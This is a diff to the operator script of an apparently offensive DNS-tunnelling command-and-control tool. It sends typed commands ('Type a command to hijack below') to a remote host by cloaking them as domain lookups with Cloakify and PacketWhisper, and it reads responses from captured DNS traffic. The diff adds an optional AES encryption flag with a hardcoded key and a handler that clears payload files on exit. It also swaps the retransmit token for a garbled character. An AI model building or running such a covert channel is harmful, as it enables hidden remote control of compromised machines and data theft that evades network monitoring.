@@ -6,14 +6,24 @@ from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
 from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
 from dns_server import start_udp_server
+import signal
+
+def clear_files_on_exit(signum, frame):
+    open('cloaked.payload', 'w').close()
+    open('cloaked_response.txt', 'w').close()
+    print("Files cleared on exit.")
+    exit(0)
+
+signal.signal(signal.SIGINT, clear_files_on_exit)
+
 
 # AES Key
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 command = None
 
-def send_command(command, dns='localhost'):
-    encrypted_command = encrypt_message(command, key) 
+def send_command(command, dns='localhost', args=None):
+    encrypted_command = encrypt_message(command, key) if args is not None and args.encrypt else command
     cloaked_command = "cloaked_command.txt"
     
     Cloakify(encrypted_command, cipher, cloaked_command)
@@ -30,10 +40,10 @@ def send_command(command, dns='localhost'):
             subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # Remove command file
-    os.remove(cloaked_command)
+    #os.remove(cloaked_command)
 
 
-def receive_response(dns='localhost', local=False):
+def receive_response(dns='localhost', local=False, args=None):
     cloakedFile = "cloaked.payload"
     if local:
         subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
@@ -52,16 +62,16 @@ def receive_response(dns='localhost', local=False):
     # Decloakify the command
     if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
         print("Requesting re-trasmission")
-        send_command('rt', dns)
+        send_command('�', dns)
         receive_response()
 
     # Decrypt the command
     with open(decloaked_response, 'r') as file:
         encrypted_response = file.read().strip()
-    response = decrypt_message(encrypted_response, key)
+    response = decrypt_message(encrypted_response, key) if args is not None and args.encrypt else encrypted_response
     print(f'\n {response}')
-    if response=='rt':
-        send_command(command)
+    if response=='�':
+        send_command(command, args=args)
     
         
 
@@ -127,7 +137,11 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
         type=str,
     )
     parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.") 
+    parser.add_argument('--encrypt', action='store_true', help="Use this flag if you want to use an encrypted communication.") 
     args = parser.parse_args()
+    
+    
+    
     print("Type a command to hijack below:")
     subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     while True:
@@ -135,11 +149,11 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
             dns = args.dns
         command = input("> ")
         if args.dns:
-            send_command(command, dns)
+            send_command(command, dns, args)
         else:\
             send_command(command)
         if args.dns:
             try:
-                receive_response(dns, args.local) 
+                receive_response(dns, args.local, args) 
             except Exception as e:
                 print(f'Something wrong happend during the connection: {e}')
